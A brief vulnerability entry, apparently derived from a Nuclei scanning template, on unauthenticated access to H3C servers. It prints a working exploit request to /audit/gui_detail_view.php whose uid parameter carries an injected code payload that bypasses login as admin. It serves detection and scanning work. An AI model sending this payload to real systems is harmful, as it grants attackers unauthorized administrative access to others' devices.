# Vulnerability: H3C Server - Unauthenticated Access
**Classification:** H3C
**Source:** Nuclei Template (`unauthorized-h3csecparh-login.yaml`)

## Description
H3C server was able to be accessed with no authentication requirements in place.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
```

